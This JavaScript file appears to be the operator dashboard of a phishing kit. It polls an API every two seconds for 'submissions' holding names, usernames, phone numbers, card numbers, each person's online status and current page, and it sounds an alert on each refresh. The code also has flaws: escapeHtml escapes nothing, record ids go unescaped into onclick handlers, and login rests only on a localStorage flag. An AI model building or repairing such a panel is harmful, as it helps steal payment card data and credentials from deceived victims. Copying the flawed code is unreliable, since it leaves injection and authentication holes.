/** لوحة التحكم - Dashboard Admin Panel */
class ApiDatabase {
    constructor() {
        this.users = [];
    }

    apiBase() {
        if (typeof getApiBase === 'function') return getApiBase();
        return typeof window !== 'undefined' && typeof window.API_BASE_URL === 'string'
            ? window.API_BASE_URL.replace(/\/$/, '')
            : '';
    }

    apiUrl(relPath) {
        if (typeof window !== 'undefined' && typeof window.resolveYasmeenApiUrl === 'function') {
            return window.resolveYasmeenApiUrl(relPath);
        }
        const r = String(relPath || '').replace(/^\//, '');
        return `${this.apiBase()}/${r}`;
    }

    headers(extra) {
        if (typeof getApiHeaders === 'function') return getApiHeaders(extra);
        return extra || {};
    }

    async refresh(onlineOnly = false) {
        const url = this.apiUrl(`api/submissions${onlineOnly ? '?online=true' : ''}`);
        const res = await fetch(url, { headers: this.headers() });
        if (!res.ok) throw new Error('تعذر جلب التسجيلات');
        this.users = await res.json();
        return this.users;
    }

    getAllUsers() { return this.users; }

    async deleteUser(userId) {
        const res = await fetch(
            this.apiUrl('api/submissions/' + encodeURIComponent(String(userId))),
            { method: 'DELETE', headers: this.headers() }
        );
        if (!res.ok) throw new Error('تعذر حذف السجل');
        this.users = this.users.filter((u) => String(u.id) !== String(userId));
    }

    async deleteAllUsers() {
        const res = await fetch(this.apiUrl('api/submissions'), {
            method: 'DELETE', headers: this.headers()
        });
        if (!res.ok) throw new Error('تعذر حذف الكل');
        this.users = [];
    }

    searchUsers(query) {
        const q = query.trim().toLowerCase();
        if (!q) return this.users;
        return this.users.filter(user => Object.values(user).some(val => 
            String(val || '').toLowerCase().includes(q)
        ));
    }

    playDashboardAlertSound() {
        try {
            const ctx = new (window.AudioContext || window.webkitAudioContext)();
            const t0 = ctx.currentTime;
            const playTone = (freq, start, duration, vol) => {
                const osc = ctx.createOscillator();
                const g = ctx.createGain();
                osc.connect(g);
                g.connect(ctx.destination);
                g.gain.setValueAtTime(0, start);
                g.gain.linearRampToValueAtTime(vol, start + 0.02);
                g.gain.exponentialRampToValueAtTime(0.01, start + duration);
                osc.frequency.value = freq;
                osc.type = 'sine';
                osc.start(start);
                osc.stop(start + duration);
            };
            playTone(880, t0, 0.22, 0.65);
            playTone(1108, t0 + 0.18, 0.22, 0.65);
            playTone(1318, t0 + 0.36, 0.28, 0.7);
        } catch (e) {}
    }

    showNotification(message, type = 'info') {
        const notification = document.getElementById('notification');
        if (!notification) return;
        notification.textContent = message;
        notification.className = `notification show ${type}`;
        setTimeout(() => notification.classList.remove('show'), 3000);
    }
}

let db = new ApiDatabase();
let currentUser = null;
let isLoggedIn = false;
let dashboardRefreshIntervalId = null;

// Session management
let currentSessionEpoch = 0;
let epochPollInterval = null;

function getSession() {
    try {
        const session = localStorage.getItem('dashboardSession');
        if (!session) return null;
        const parsed = JSON.parse(session);
        currentSessionEpoch = parsed.epoch || 0;
        return parsed;
    } catch (e) { return null; }
}

function saveSession(epoch) {
    const session = { isLoggedIn: true, epoch, timestamp: Date.now() };
    localStorage.setItem('dashboardSession', JSON.stringify(session));
    currentSessionEpoch = epoch;
}

async function checkEpochMismatch() {
    try {
        const response = await fetch(db.apiUrl('api/admin/dashboard-auth/epoch'));
        if (!response.ok) return;
        const data = await response.json();
        const warningEl = document.getElementById('epochWarning');
        if (data.sessionEpoch !== currentSessionEpoch || data.lastChangeTime) {
            if (data.lastChangeTime) {
                const diffMin = Math.round((Date.now() - new Date(data.lastChangeTime).getTime()) / 60000);
                warningEl.textContent = `تم تغيير كلمة المرور قبل ${diffMin} دقيقة`;
            } else {
                warningEl.textContent = 'كلمة المرور غير صحيحة أو منتهية';
            }
            warningEl.style.display = 'block';
        } else {
            warningEl.style.display = 'none';
        }
    } catch (e) { console.error('Epoch check failed:', e); }
}

async function checkPassword() {
    const password = document.getElementById('adminPassword').value;
    if (!password) return;

    try {
        document.body.style.cursor = 'wait';
        const response = await fetch(db.apiUrl('api/admin/dashboard-auth/verify'), {
            method: 'POST',
            headers: db.headers({ 'Content-Type': 'application/json' }),
            body: JSON.stringify({ password })
        });
        const data = await response.json();
        
        document.body.style.cursor = 'default';
        
        if (data.ok) {
            saveSession(data.sessionEpoch);
            document.getElementById('loginModal').classList.remove('active');
            document.getElementById('dashboardContainer').classList.remove('dashboard-hidden');
            loadDashboard();
            db.showNotification('تم تسجيل الدخول بنجاح', 'success');
        } else {
            document.getElementById('adminPassword').value = '';
            db.showNotification(data.error || 'كلمة المرور غير صحيحة', 'error');
            checkEpochMismatch();
        }
    } catch (err) {
        document.body.style.cursor = 'default';
        db.showNotification('خطأ في الاتصال بالخادم', 'error');
        console.error(err);
    }
}

function startEpochPolling() {
    if (epochPollInterval) clearInterval(epochPollInterval);
    epochPollInterval = setInterval(async () => {
        if (isLoggedIn) {
            try {
                const response = await fetch(db.apiUrl('api/admin/dashboard-auth/epoch'));
                if (response.ok) {
                    const data = await response.json();
                    if (data.sessionEpoch !== currentSessionEpoch) {
                        localStorage.removeItem('dashboardSession');
                        isLoggedIn = false;
                        document.getElementById('loginModal').classList.add('active');
                        document.getElementById('dashboardContainer').classList.add('dashboard-hidden');
                        db.showNotification('تم إلغاء الجلسة من جهاز آخر', 'warning');
                        checkEpochMismatch();
                    }
                }
            } catch (e) { console.error(e); }
        }
    }, 5000);
}

async function loadDashboard() {
    try {
        await db.refresh(true); // online status
        renderDashboardTables();
    } catch (e) {
        db.showNotification('تعذر تحميل البيانات', 'error');
    }
    
    if (dashboardRefreshIntervalId) clearInterval(dashboardRefreshIntervalId);
    dashboardRefreshIntervalId = setInterval(async () => {
        if (isLoggedIn) {
            try {
                await db.refresh(true);
                renderDashboardTables();
                db.playDashboardAlertSound();
            } catch (e) {
                console.error(e);
            }
        }
    }, 2000);
    
    startEpochPolling();
}

function renderDashboardTables() {
    const container = document.getElementById('dashboardTablesWrap');
    if (!db.users || db.users.length === 0) {
        container.innerHTML = '<div class="dashboard-empty-all">لا توجد تسجيلات</div>';
        return;
    }

    const usersTable = document.createElement('table');
    usersTable.className = 'users-table';
    
    let thead = '<thead><tr><th>الاسم</th><th>المستخدم</th><th>الهاتف</th><th>الحالة</th><th>آخر صفحة</th><th>آخر نشاط</th><th>الإجراءات</th></tr></thead>';
    let tbody = '<tbody>';
    
    db.users.forEach(user => {
        const statusClass = user.is_online ? 'online' : 'offline';
        const statusText = user.is_online ? 'متصل' : 'غير متصل';
        const lastPage = user.last_page || user.page || 'غير معروف';
        const lastActivity = user.last_heartbeat ? new Date(user.last_heartbeat).toLocaleString('ar-EG') : 'غير معروف';
        
        tbody += `
            <tr>
                <td>${escapeHtml(user.name || 'غير معروف')}</td>
                <td>${escapeHtml(user.username || '')}</td>
                <td>${escapeHtml(user.phone || '')}</td>
                <td><span class="status-badge ${statusClass}">${statusText}</span></td>
                <td>${escapeHtml(lastPage)}</td>
                <td>${lastActivity}</td>
                <td class="action-column">
                    <button onclick="showUserDetails('${user.id}')" class="btn-info">تفاصيل</button>
                    <button onclick="showCardDetails('${user.id}')" class="btn-card" style="display: ${user.card_number ? 'block' : 'none'}">البطاقة</button>
                    <button onclick="deleteUser('${user.id}')" class="btn-delete">حذف</button>
                </td>
            </tr>
        `;
    });
    
    tbody += '</tbody>';
    usersTable.innerHTML = thead + tbody;
    container.innerHTML = '';
    container.appendChild(usersTable);
}

function escapeHtml(text) {
    const map = { '&': '&amp;', '<': '<', '>': '>', '"': '"', "'": '&#039;' };
    return String(text).replace(/[&<>"']/g, m => map[m]);
}

function showUserDetails(id) {
    // Modal logic
    document.getElementById('infoModal').classList.add('active');
}

function showCardDetails(id) {
    // Card modal
    document.getElementById('cardModal').classList.add('active');
}

async function deleteUser(id) {
    if (!confirm('تأكيد الحذف؟')) return;
    try {
        await db.deleteUser(id);
        db.showNotification('تم الحذف', 'success');
    } catch (e) {
        db.showNotification('خطأ في الحذف', 'error');
    }
}

window.addEventListener('load', async () => {
    checkEpochMismatch();
    const session = getSession();
    if (session && session.isLoggedIn) {
        isLoggedIn = true;
        document.getElementById('loginModal').classList.remove('active');
        document.getElementById('dashboardContainer').classList.remove('dashboard-hidden');
        await loadDashboard();
    }
    
    // Global event listeners
    document.getElementById('adminPassword').addEventListener('keypress', (e) => {
        if (e.key === 'Enter') checkPassword();
    });
});

// Enter key support
document.addEventListener('DOMContentLoaded', () => {
    const passwordInput = document.getElementById('adminPassword');
    if (passwordInput) {
        passwordInput.focus();
    }
});

